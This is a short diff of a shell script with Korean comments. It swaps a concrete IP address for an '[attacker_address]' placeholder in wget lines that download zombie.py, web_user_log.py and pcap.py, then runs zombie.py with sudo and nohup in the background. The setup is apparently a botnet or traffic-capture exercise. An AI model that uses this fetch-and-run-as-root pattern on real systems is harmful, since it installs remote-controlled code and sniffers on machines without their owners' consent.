@@ -1,9 +1,9 @@
 #파일 다운로드
-wget 222.96.227.76:8080/upload/zombie.py
+wget [attacker_address]/upload/zombie.py
 
-wget 222.96.227.76:8080/upload/web_user_log.py
+wget [attacker_address]/upload/web_user_log.py
 
-wget 222.96.227.76:8080/upload/pcap.py
+wget [attacker_address]/upload/pcap.py
 
 # 1. zombie.py 스크립트 실행
 nohup sudo python3 zombie.py &
